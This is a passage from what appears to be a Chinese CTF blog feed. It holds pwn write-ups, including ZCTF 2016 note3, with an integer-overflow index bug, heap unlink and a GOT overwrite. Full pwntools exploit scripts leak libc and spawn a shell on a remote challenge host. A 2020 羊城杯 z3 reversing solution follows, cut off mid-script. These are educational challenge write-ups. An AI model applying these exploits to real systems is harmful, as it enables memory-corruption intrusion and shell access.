u64(puts_addr)</span><br><span class="line">    log.success(<span class="string">&#x27;puts addr: &#x27;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line">    libc_base = puts_addr - libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">    log.success(<span class="string">&#x27;libc base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    binsh_addr = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># make free-&gt;system</span></span><br><span class="line">    write(elf.got[<span class="string">&#x27;free&#x27;</span>], system_addr)</span><br><span class="line">    <span class="comment"># make destructor point to /bin/sh addr</span></span><br><span class="line">    write(<span class="number">0x6030E8</span>, binsh_addr)</span><br><span class="line">    <span class="comment"># get shell</span></span><br><span class="line">    remove(<span class="number">6</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure><h2 id="ZCTF-2016-note3"><a href="#ZCTF-2016-note3" class="headerlink" title="ZCTF 2016 note3"></a>ZCTF 2016 note3</h2><h3 id="基本情况"><a href="#基本情况" class="headerlink" title="基本情况"></a>基本情况</h3><pre><code>Arch:     amd64-64-littleRELRO:    Partial RELROStack:    Canary foundNX:       NX enabledPIE:      No PIE (0x400000)</code></pre><h3 id="基本功能-1"><a href="#基本功能-1" class="headerlink" title="基本功能"></a>基本功能</h3><p>基本堆管理，有增删改功能。</p><p>堆数量上限为 8 个，大小在 0~1024 之间自定义。堆指针指针和 size 分别用一个列表存放，结合后面推测出，qword_6020C0[0] 为一个缓冲区，存储刚刚操作的完的 chunk_ptr 。</p><h3 id="漏洞-1"><a href="#漏洞-1" class="headerlink" title="漏洞"></a>漏洞</h3><p>delete 和 edit 读取序号时有点特殊，将输入值经过加密后的结果直接当做是下标，<strong>没有再进一步检查下标是否非法的</strong>：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v3 = v0 - <span class="number">7</span> * (((<span class="keyword">signed</span> __int64)((<span class="keyword">unsigned</span> __int128)(<span class="number">5270498306774157605LL</span> * (<span class="keyword">signed</span> __int128)v0) &gt;&gt; <span class="number">64</span>) &gt;&gt; <span class="number">1</span>) - (v0 &gt;&gt; <span class="number">63</span>));</span><br></pre></td></tr></table></figure><p>这里存在一个整型溢出，当输入值为 0x8000000000000000 ，结果为 -1 ，这样就将修改缓冲区的堆块，修改程度为 chunk7 地址：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">.bss:</span><br><span class="line">current_ptr &lt;&#x3D;&#x3D; edit ptr</span><br><span class="line">note0_ptr</span><br><span class="line">note1_ptr</span><br><span class="line">note2_ptr</span><br><span class="line">note3_ptr</span><br><span class="line">note4_ptr</span><br><span class="line">note5_ptr</span><br><span class="line">note6_ptr</span><br><span class="line">note7_ptr   &lt;&#x3D;&#x3D; size</span><br><span class="line">note0_size</span><br><span class="line">note1_size</span><br><span class="line">note2_size</span><br><span class="line">note3_size</span><br><span class="line">note4_size</span><br><span class="line">note5_size</span><br><span class="line">note6_size</span><br><span class="line">note7_size</span><br></pre></td></tr></table></figure><p>由于输入长度有限，所以将原值转换为负数：<code>0x8000000000000000 - 0x10000000000000000</code> 。</p><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><ol><li>利用整型漏洞，形成一个堆溢出。修改 next_chunk 的 header 信息，构造 unlink 条件。</li><li>unlink 后控制 chunk_ptr 指针，实现任意地址读写。由于程序输出功能，将 free 改为 puts 用来泄露地址，然后在将 free 改为 system 。</li></ol><h3 id="EXP-2"><a href="#EXP-2" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level = <span class="string">&#x27;info&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./note3&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node3.buuoj.cn&quot;</span>,<span class="number">25763</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./note3&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;1024)\n&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;content:\n&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;\n&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;note:\n&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;content:\n&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;\n&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;note:\n&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>():</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&gt;\n&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="number">0x90</span>,<span class="string">&#x27;b&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">add(<span class="number">0x50</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,<span class="string">&#x27;skyedidi&#x27;</span>)</span><br><span class="line"></span><br><span class="line">ptr = <span class="number">0x6020d8</span></span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x51</span>)</span><br><span class="line">payload += p64(ptr-<span class="number">0x18</span>) + p64(ptr-<span class="number">0x10</span>)</span><br><span class="line">payload = payload.ljust(<span class="number">0x50</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload += p64(<span class="number">0x50</span>) + p64(<span class="number">0xa0</span>)</span><br><span class="line">edit(<span class="number">0x8000000000000000</span> - <span class="number">0x10000000000000000</span>,payload)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;skyedidi&#x27;</span> + p64(elf.got[<span class="string">&#x27;free&#x27;</span>]) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(<span class="number">0x6020c0</span>)</span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])[:<span class="number">7</span>])</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">puts_leak = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))</span><br><span class="line">log.info(<span class="string">&quot;puts_leak:&quot;</span>+<span class="built_in">hex</span>(puts_leak))</span><br><span class="line">libc_base = puts_leak - <span class="number">0x06f690</span><span class="comment">#libc.sym[&#x27;puts&#x27;]</span></span><br><span class="line">system = libc_base + <span class="number">0x045390</span><span class="comment">#libc.sym[&#x27;system&#x27;]</span></span><br><span class="line">binsh = libc_base + <span class="number">0x18cd57</span><span class="comment">#next(libc.search(&#x27;/bin/sh&#x27;))</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(system)[:<span class="number">7</span>])</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;skyedidi&#x27;</span> + p64(elf.got[<span class="string">&#x27;free&#x27;</span>]) + p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload += p64(binsh)</span><br><span class="line">edit(<span class="number">2</span>,payload)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> unlink </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020羊城杯Writeup</title>
      <link href="archives/85e155ec/"/>
      <url>archives/85e155ec/</url>
      
        <content type="html"><![CDATA[<h2 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h2><h3 id="login"><a href="#login" class="headerlink" title="login"></a>login</h3><p>下载附件是一个 pyinstaller 打包的 exe 文件。</p><h4 id="反编译-exe"><a href="#反编译-exe" class="headerlink" title="反编译 exe"></a>反编译 exe</h4><p>使用 <code>pyinstxtractor.py</code> 反编译：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python pyinstxtractor.py login.exe</span><br></pre></td></tr></table></figure><blockquote><p>或者用 <code>Pyinstaller</code> 中的 \utils\cliutils\archive_viewer.py ，具体方法百度，略有不同</p></blockquote><p>找到目录中同名无后缀文件，修改后缀为 <code>.pyc</code> ，接着再找到 <code>struct</code> 一并复制出来。用 winhex 将 login.pyc 文件还原回来，pyinstaller 会去除这部分信息（python 版本、时间戳）。将 struct 前 8 字节添加到 login.pyc 开头，struct 文件头信息与 login.pyc 编译前一致，直接复制懒得去找对应 python 版本的文件头。</p><p><img src="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200910223542.png"></p><p>在线网站反编译 pyc 文件得到源码。</p><h3 id="逆加密算法"><a href="#逆加密算法" class="headerlink" title="逆加密算法"></a>逆加密算法</h3><p>15 元 1 次方的方程，用 z3 库解决时，设置变量为 Int 型需要注释有 <code>(a8 &lt;&lt; 7)</code> 这一条方程，否则因为变量类型问题无法运算。这时计算结果明显错误，需要添加约束，约束全部 a 都是 &gt;= 0 的。这是能计算出正确结果，将得出值用被注释方程验证，方程成立，结果为真。</p><p>然后就是一个迭代的异或解密，前一轮解密结果参与下一轮解密：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">step1</span>():</span></span><br><span class="line">    a1 = Int(<span class="string">&#x27;a1&#x27;</span>)</span><br><span class="line">    a2 = Int(<span class="string">&#x27;a2&#x27;</span>)</span><br><span class="line">    a3 = Int(<span class="string">&#x27;a3&#x27;</span>)</span><br><span class="line">    a4 = Int(<span class="string">&#x27;a4&#x27;</span>)</span><br><span class="line">    a5 = Int(<span class="string">&#x27;a5&#x27;</span>)</span><br><span class="line">    a6 = Int(<span class="string">&#x27;a6&#x27;</span>)</span><br><span class="line">    a7 = Int(<span class="string">&#x27;a7&#x27;</span>)</span><br><span class="line">    a8 = Int(<span class="string">&#x27;a8&#x27;</span>)</span><br><span class="line">    a9 = Int(<span class="string">&#x27;a9&#x27;</span>)</span><br><span class="line">    a10 = Int(<span class="string">&#x27;a10&#x27;</span>)</span><br><span class="line">    a11 = Int(<span class="string">&#x27;a11&#x27;</span>)</span><br><span class="line">    a12 = Int(<span class="string">&#x27;a12&#x27;</span>)</span><br><span class="line">    a13 = Int(<span class="string">&#x27;a13&#x27;</span>)</span><br><span class="line">    a14 = Int(<span class="string">&#x27;a14&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    solver = Solver()</span><br><span class="line"></span><br><span class="line">    solver.add((((a1 * <span class="number">88</span> + a2 * <span class="number">67</span> + a3 * <span class="number">65</span> - a4 * <span class="number">5</span>) + a5 * <span class="number">43</span> + a6 * <span class="number">89</span> + a7 * <span class="number">25</span> + a8 * <span class="number">13</span> - a9 * <span class="number">36</span>) + a10 * <span class="number">15</span> + a11 * <span class="number">11</span> + a12 * <span class="number">47</span> - a13 * <span class="number">60</span>) + a14 * <span class="number">29</span> == <span class="number">22748</span>)</span><br><span class="line">    solver.add((((a1 * <span class="number">89</span> + a2 * <span class="number">7</span> + a3 * <span class="number">12</span> - a4 * <span class="number">25</span>) + a5 * <span class="number">41</span> + a6 * <span class="number">23</span> + a7 * <span class="number">20</span> - a8 * <span class="number">66</span>) + a9 * <span class="number">31</span> + a10 * <span class="number">8</span> + a11 * <span class="number">2</span> - a12 * <span class="number">41</span> - a13 * <span class="number">39</span>) + a14 * <span class="number">17</span> == <span class="number">7258</span>)</span><br><span class="line">    solver.add((((a1 * <span class="number">28</span> + a2 * <span class="number">35</span> + a3 * <span class="number">16</span> - a4 * <span class="number">65</span>) + a5 * <span class="number">53</span> + a6 * <span class="number">39</span> + a7 * <span class="number">27</span> + a8 * <span class="number">15</span> - a9 * <span class="number">33</span>) + a10 * <span class="number">13</span> + a11 * <span class="number">101</span> + a12 * <span class="number">90</span> - a13 * <span class="number">34</span>) + a14 * <span class="number">23</span> == <span class="number">26190</span>)</span><br><span class="line">    <span class="comment"># True</span></span><br><span class="line">    <span class="comment"># solver.add((((a1 * 23 + a2 * 34 + a3 * 35 - a4 * 59) + a5 * 49 + a6 * 81 + a7 * 25 + (a8 &lt;&lt; 7) - a9 * 32) + a10 * 75 + a11 * 81 + a12 * 47 - a13 * 60) + a14 * 29 == 37136) </span></span><br><span class="line">    solver.add(((a1 * <span class="number">38</span> + a2 * <span class="number">97</span> + a3 * <span class="number">35</span> - a4 * <span class="number">52</span>) + a5 * <span class="number">42</span> + a6 * <span class="number">79</span> + a7 * <span class="number">90</span> + a8 * <span class="number">23</span> - a9 * <span class="number">36</span>) + a10 * <span class="number">57</span> + a11 * <span class="number">81</span> + a12 * <span class="number">42</span> - a13 * <span class="number">62</span> - a14 * <span class="number">11</span> == <span class="number">27915</span>) </span><br><span class="line">    solver.add((((a1 * <span class="number">22</span> + a2 * <span class="number">27</span> + a3 * <span class="number">35</span> - a4 * <span class="number">45</span>) + a5 * <span class="number">47</span> + a6 * <span class="number">49</span> + a7 * <span class="number">29</span> + a8 * <span class="number">18</span> - a9 * <span class="number">26</span>) + a10 * <span class="number">35</span> + a11 * <span class="number">41</span> + a12 * <span class="number">40</span> - a13 * <span class="number">61</span>) + a14 * <span class="number">28</span> == <span class="number">17298</span>) </span><br><span class="line">    solver.add((((a1 * <span class="number">12</span> + a2 * <span class="number">45</span> + a3 * <span class="number">35</span> - a4 * <span class="number">9</span> - a5 * <span class="number">42</span>) + a6 * <span class="number">86</span> + a7 * <span class="number">23</span> + a8 * <span class="number">85</span> - a9 * <span class="number">47</span>) + a10 * <span class="number">34</span> + a11 * <span class="number">76</span> + a12 * <span class="number">43</span> - a13 * <span class="number">44</span>) + a14 * <span class="number">65</span> == <span class="number">19875</span>) </span><br><span class="line">    solver.add(((a1 * <span class="number">79</span> + a2 * <span class="number">62</span> + a3 * <span class="number">35</span> - a4 * <span class="number">85</span>) + a5 * <span class="number">33</span> + a6 * <span class="number">79</span> + a7 * <span class="number">86</span> + a8 * <span class="number">14</span> - a9 * <span class="number">30</span>) + a10 * <span class="number">25</span> + a11 * <span class="number">11</span> + a12 * <span class="number">57</span> - a13 * <span class="number">50</span> - a14 * <span class="number">9</span> == <span class="number">22784</span>) </span><br><span class="line">    solver.add((((a1 * <span class="number">8</span> + a2 * <span class="number">6</span> + a3 * <span class="number">64</span> - a4 * <span class="number">85</span>) + a5 * <span class="number">73</span> + a6 * <span class="number">29</span> + a7 * <span class="number">2</span> + a8 * <span class="number">23</span> - a9 * <span class="number">36</span>) + a10 * <span class="number">5</span> + a11 * <span class="number">2</span> + a12 * <span class="number">47</span> - a13 * <span class="number">64</span>) + a14 * <span class="number">27</span> == <span class="number">9710</span>) </span><br><span class="line">    solver.add(((((a1 * <span class="number">67</span> - a2 * <span class="number">68</span>) + a3 * <span class="number">68</span> - a4 * <span class="number">51</span> - a5 * <span class="number">43</span>) + a6 * <span class="number">81</span> + a7 * <span class="number">22</span> - a8 * <span class="number">12</span> - a9 * <span class="number">38</span>) + a10 * <span class="number">75</span> + a11 * <span class="number">41</span> + a12 * <span class="number">27</span> - a13 * <span class="number">52</span>) + a14 * <span class="number">31</span> == <span class="number">13376</span>) </span><br><span class="line">    solver.add((((a1 * <span class="number">85</span> + a2 * <span class="number">63</span> + a3 * <span class="number">5</span> - a4 * <span class="number">51</span>) + a5 * <span class="number">44</span> + a6 * <span class="number">36</span> + a7 * <span class="number">28</span> + a8 * <span class="number">15</span> - a9 * <span class="number">6</span>) + a10 * <span class="number">45</span> + a11 * <span class="number">31</span> + a12 * <span class="number">7</span> - a13 * <span class="number">67</span>) + a14 * <span class="number">78</span> == <span class="number">24065</span>) </span><br><span class="line">    solver.add((((a1 * <span class="number">47</span> + a2 * <span class="number">64</span> + a3 * <span class="number">66</span> - a4 * <span class="number">5</span>) + a5 * <span class="number">43</span> + a6 * <span class="number">112</span> + a7 * <span class="number">25</span> + a8 * <span class="number">13</span> - a9 * <span class="number">35</span>) + a10 * <span class="number">95</span> + a11 * <span class="number">21</span> + a12 * <span class="number">43</span> - a13 * <span class="number">61</span>) + a14 * <span class="number">20</span> == <span class="number">27687</span>) </span><br><span class="line">    solver.add(((a1 * <span class="number">89</span> + a2 * <span class="number">67</span> + a3 * <span class="number">85</span> - a4 * <span class="number">25</span>) + a5 * <span class="number">49</span> + a6 * <span class="number">89</span> + a7 * <span class="number">23</span> + a8 * <span class="number">56</span> - a9 * <span class="number">92</span>) + a10 * <span class="number">14</span> + a11 * <span class="number">89</span> + a12 * <span class="number">47</span> - a13 * <span class="number">61</span> - a14 * <span class="number">29</span> == <span class="number">29250</span>) </span><br><span class="line">    solver.add(((a1 * <span class="number">95</span> + a2 * <span class="number">34</span> + a3 * <span class="number">62</span> - a4 * <span class="number">9</span> - a5 * <span class="number">43</span>) + a6 * <span class="number">83</span> + a7 * <span class="number">25</span> + a8 * <span class="number">12</span> - a9 * <span class="number">36</span>) + a10 * <span class="number">16</span> + a11 * <span class="number">51</span> + a12 * <span class="number">47</span> - a13 * <span class="number">60</span> - a14 * <span class="number">24</span> == <span class="number">15317</span>)</span><br><span class="line"></span><br><span class="line">    solver.add(a1 &gt;= <span class="number">0</span>)</span><br><span class="line">    solver.add(a2 &gt;= <span class="number">0</span>)</span><br><span class="line">    solver.add(a3 &gt;= <span class="number">0</span>)</span><br><span class="line">    solver.add(a4 &gt;= <span class="number">0</span>)</span><br><span class="line">    solver.add(a5 &gt;= <span class="number">0</span>)</span><br><span class="line">    solver.add(a6 &gt;= <span class="number">0</span>)</span><br><span class="line">    solver.add(a7 &gt;= <span class="number">0</span>)</span><br><span class="line">    solver.add(a8 &gt;= <span class="number">0</span>)</span><br><span class="line">    solver.add(a9 &gt;= <span class="number">0</span>)</span><br><span class="line">    solver.add(a10 &gt;= <span class="number">0</span>)</span><br><span class="line">    solver.add(a11 &gt;= <span class="number">0</span>)</span><br><span class="line">    solver.add(a12 &gt;= <span class="number">0</span>)</span><br><span class="line">    solver.add(a13 &gt;= <span class="number">0</span>)</span><br><span class="line">    solver.add(a14 &gt;= <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># solver.add(a1 &lt; 127)</span></span><br><span class="line">    <span class="comment"># solver.add(a1 &gt;= 32)</span></span><br><span class="line">    <span class="comment"># solver.add(a2 &lt; 127)</span></span><br><span class="line">    <span class="comment"># solver.add(a2 &gt;= 32)</span></span><br><span class="line">    <span class="comment"># solver.add(a3 &lt; 127)</span></span><br><span class="line">    <span class="comment"># solver.add(a3 &gt;= 32)</span></span><br><span class="line">    <span class="comment"># solver.add(a4 &lt; 127)</span></span><br><span class="line">    <span class="comment"># solver.add(a4 &gt;= 32)</span></span><br><span class="line">    <span class="comment"># solver.add(a5 &lt; 127)</span></span><br><span class="line">    <span class="comment"># solver.add(a5&gt;= 32)</span></span><br><span class="line">    <span class="comment"># solver.add(a6 &lt; 127)</span></span><br><span class="line">    <span class="comment"># solver.add(a6 &gt;= 32)</span></span><br><span class="line">    <span class="comment"># solver.add(a7 &lt; 127)</span></span><br><span class="line">    <span class="comment"># solver.add(a7 &gt;= 32)</span></span><br><span class="line">    <span class="comment"># solver.add(a8 &lt; 127)</span></span><br><span class="line">    <span class="comment"># solver.add(a8 &gt;= 32)</span></span><br><span class="line">    <span class="comment"># solver.add(a9 &lt; 127)</span></span><br><span class="line">    <span class="comment"># solver.add(a9 &gt;= 32)</span></span><br><span class="line">    <span class="comment"># solver.add(a10 &lt; 127)</span></span><br><span class="line">    <span class="comment"># solver.add(a10 &gt;= 32)</span></span><br><span class="line">    <span class="comment"># solver.add(a11 &lt; 127)</span></span><br><span class="line">    <span class="comment"># solver.add(a11 &gt;= 32)</span></span><br><span class="line">    <span class="comment"># solver.add(a12 &lt; 127)</span></span><br><span class="line">    <span class="comment"># solver.add(a12 &gt;= 32)</span></span><br><span class="line">    <span class="comment"># solver.add(a13 &lt; 127)</span></span><br><span class="line">    <span class="comment"># solver.add(a13 &gt;= 32)</span></span><br><span class="line">    <span class="comment"># solver.add(a14 &lt; 127)</span></span><br><span class="line">    <span class="comment"># solver.add(a14 &gt;= 32)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> solver.check() == sat:</span><br><span class="line">        print(<span class="string">&quot;solver&quot;</span>)</span><br><span class="line">        ans = solver.model()</span><br><span class="line">        print(ans)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&quot;no&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">step2</span>():</span></span><br><span class="line">    a1 = <span class="number">119</span></span><br><span class="line">    a2 = <span class="number">24</span></span><br><span class="line">    a3 = <span class="number">10</span></span><br><span class="line">    a4 = <span class="number">7</span></span><br><span class="line">    a5 = <span class="number">104</span></span><br><span class="line">    a6 = <span class="number">43</span></span><br><span class="line">    a7 = <span class="number">28</span></span><br><span class="line">    a8 = <span class="number">91</span></span><br><span class="line">    a9 = <span class="number">52</span></span><br><span class="line">    a10 = <span class="number">108</span></span><br><span class="line">    a11 = <span class="number">88</span></span><br><span class="line">    a12 = <span class="number">74</span></span><br><span class="line">    a13 = <span class="number">88</span><span class="comment">#121</span></span><br><span class="line">    a14 = <span class="number">33</span></span><br><span class="line"></span><br><span class="line">    code = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>, <span class="number">13</span>]</span><br><span class="line"></span><br><span class="line">    code[<span class="number">0</span>] = a3</span><br><span class="line">    code[<span class="number">1</span>] = a2</span><br><span class="line">    code[<span class="number">2</span>] = a1</span><br><span class="line">    code[<span class="number">3</span>] = a4</span><br><span class="line">    code[<span class="number">4</span>] = a5</span><br><span class="line">    code[<span class="number">5</span>] = a6</span><br><span class="line">    code[<span class="number">6</span>] = a7</span><br><span class="line">    code[<span class="number">7</span>] = a8</span><br><span class="line">    code[<span class="number">9</span>] = a9</span><br><span class="line">    code[<span class="number">8</span>] = a10</span><br><span class="line">    code[<span class="number">10</span>] = a11</span><br><span class="line">    code[<span class="number">11</span>] = a12</span><br><span class="line">    code[<span class="number">12</span>] = a13</span><br><span class="line">    code[<span class="number">13</span>] = a14</span><br><span class="line"></span><br><span class="line">    flag = []</span><br><span class="line">    flag.append(<span class="built_in">chr</span>(code[<span class="number">13</span>]))</span><br><span class="line">    <span class="keyword">for</span> i 